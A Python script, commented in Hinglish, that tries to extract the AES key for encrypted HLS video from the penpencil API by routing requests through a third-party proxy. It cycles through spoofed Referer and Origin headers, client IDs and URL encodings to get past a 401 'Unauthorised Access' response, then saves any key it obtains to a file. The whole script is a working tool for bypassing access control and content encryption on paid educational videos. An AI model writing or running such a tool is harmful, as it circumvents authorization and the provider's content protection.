"""
Final AES-key hunt
==================
player.studyratna.org ek allow-list proxy worker hai: `/?url=<target>`.
Wo request ko aage bhejta hai - penpencil ka 401 "Unauthorised Access"
isi ka response hai. Yahan har sambhavit header/param combo try hota hai.
Safal hone par `hls_key.txt` (hex) likhta hai.
"""

import asyncio
import sys
import urllib.parse

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

UUID = "bfa6e07b-8ad3-4308-8aa3-5441a6e61eca"
CLIENT = "5eb393ee95fab7468a79d189"

PEN = (f"https://api.penpencil.co/v1/videos/get-hls-key"
       f"?videoKey={UUID}&key=enc.key")
PROXY = "https://player.studyratna.org"


async def main():
    from playwright.async_api import async_playwright

    enc = urllib.parse.quote(PEN, safe="")
    dbl = urllib.parse.quote(enc, safe="")

    urls = [
        f"{PROXY}/?url={enc}",
        f"{PROXY}/?url={enc}&client-id={CLIENT}",
        f"{PROXY}/?url={enc}&key=enc.key",
        f"{PROXY}/proxy?url={enc}",
        f"{PROXY}/stream?url={enc}",
        f"{PROXY}/?url={dbl}",
    ]

    header_sets = [
        ("baseline", {}),
        ("client-id", {"client-id": CLIENT}),
        ("x-client-id", {"x-client-id": CLIENT}),
        ("client-id+ver", {"client-id": CLIENT, "version": "16"}),
        ("bearer", {"authorization": f"Bearer {CLIENT}"}),
        ("x-requested-with", {"x-requested-with": "XMLHttpRequest",
                              "client-id": CLIENT}),
        ("range", {"client-id": CLIENT, "accept": "*/*",
                   "referer": "https://player.studyratna.org/"}),
    ]

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=[
            "--no-sandbox", "--disable-dev-shm-usage"])
        ctx = await browser.new_context(user_agent=UA, locale="en-IN")
        await ctx.set_extra_http_headers({
            "Referer": "https://app.studyratna.org/",
            "Origin": "https://app.studyratna.org"})

        found = None
        for u in urls:
            for name, hdrs in header_sets:
                try:
                    r = await ctx.request.get(u, headers=hdrs, timeout=20000)
                    b = await r.body()
                    tag = f"{urls.index(u)}/{name}"
                    if r.status == 200 and len(b) in (16, 32):
                        print(f"[+++] KEY {tag}: {b.hex()}", flush=True)
                        with open("hls_key.txt", "w") as f:
                            f.write(b.hex())
                        found = b
                        break
                    print(f"[{tag}] {r.status} len={len(b)} "
                          f"{b[:60]!r}", flush=True)
                except Exception as e:
                    print(f"[{urls.index(u)}/{name}] err {str(e)[:60]}",
                          flush=True)
            if found:
                break

        # bina header ke ek aur attempt (worker ko naya session mile)
        if not found:
            for u in urls[:3]:
                try:
                    r = await ctx.request.get(u, timeout=20000)
                    b = await r.body()
                    if r.status == 200 and len(b) in (16, 32):
                        print(f"[+++] KEY (plain): {b.hex()}", flush=True)
                        with open("hls_key.txt", "w") as f:
                            f.write(b.hex())
                        found = b
                        break
                except Exception:
                    pass

        print("[=] key mili" if found else "[=] key nahi mili", flush=True)
        await browser.close()
    return 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
